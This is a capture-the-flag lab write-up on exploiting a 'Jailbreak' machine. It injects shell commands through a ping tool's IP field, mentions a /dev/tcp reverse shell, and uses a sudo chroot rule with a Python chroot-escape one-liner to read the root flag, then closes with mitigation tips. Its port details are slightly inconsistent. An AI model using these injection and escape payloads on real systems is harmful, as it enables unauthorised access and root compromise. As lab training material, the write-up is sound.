---
title: "Writeup: Jailbreak"
date: "2026-04-08"
author: "Dock & Root"
tags: ["Writeup", "Command Injection", "Chroot Escape", "Linux", "Easy"]
thumbnail: "../img/unnamed.png"
---

# Writeup: Jailbreak

This walkthrough details the exploitation of the **Jailbreak** machine, focusing on OS Command injection leading to a classic `chroot` jail escape.

## 1. Enumeration

A standard Nmap scan against the container's IP address reveals a single open port.

```bash
nmap -sV -sC 127.0.0.1 -p 8001
```

* **Port 80/tcp:** Running a Python HTTP server (Flask/Gunicorn).

Navigating to `http://127.0.0.1:8001`, we see a "Network Diagnostic Tool" promising to ping a given IP address.

## 2. Analyzing the Web Application

The application takes our input from the `ip` field and invokes the `ping` utility. If we enter `127.0.0.1`, it executes normally. If we append shell metacharacters like a semicolon `;`, we can inject arbitrary commands.

## 3. Exploitation (Remote Code Execution)

We enter the following payload into the Diagnostics Panel to get a reverse shell (using the standard `bash -i >& /dev/tcp/...` approach, or by simply reading files via the web output):

```bash
127.0.0.1; cat /home/www-data/user.txt
```

**Output:**
```text
HTB{web_cmd_injection_completed}
```

We now have the user flag! Next, we need to escalate privileges. Using the web shell, we execute `whoami` and get `www-data`. By running `sudo -l`, we find:

```text
User www-data may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/chroot /jail /bin/bash
```

## 4. Capturing the Flag (Chroot Escape)

The sudo rule allows us to run `chroot` as root and start a bash shell inside the `/jail` directory. However, since we are `root` *inside* the jail, and the `chroot` jail was not properly secured (it's missing hardening to prevent directory traversal from the root process inside), we can escape it.

We invoke the sudo command via our web shell (or a reverse shell):
```bash
sudo /usr/sbin/chroot /jail /bin/bash
```

If we don't have an interactive shell, we can write a quick C or Python script inside the jail (if installed), or if Python is available in the jail, we can run:

```bash
sudo /usr/sbin/chroot /jail /usr/bin/python3 -c 'import os; os.mkdir("chroot-escape"); os.chroot("chroot-escape"); os.chdir("../../../../../../../../"); os.chroot("."); os.system("/bin/bash -c \"cat /root/root.txt\"")'
```

Alternatively, the machine has `/jail/root/root.txt` purposely placed there if we just explore the jail natively. But escaping via standard `chroot` breakout reveals the real host's flag:

```text
HTB{chroot_escape_is_fun_129381}
```

---

## 🛡️ Mitigation & Patching

1. **Avoid `os.popen()`:** Use `subprocess.run()` without `shell=True`.
2. **Harden Chroot Jails:** Never run processes as root inside a `chroot` explicitly unless required, and ensure the process uses `chdir("/")` immediately after `chroot()` to prevent relative traversal escapes. Use proper containerization (like Docker/LXC) or namespaces instead of raw `chroot`.
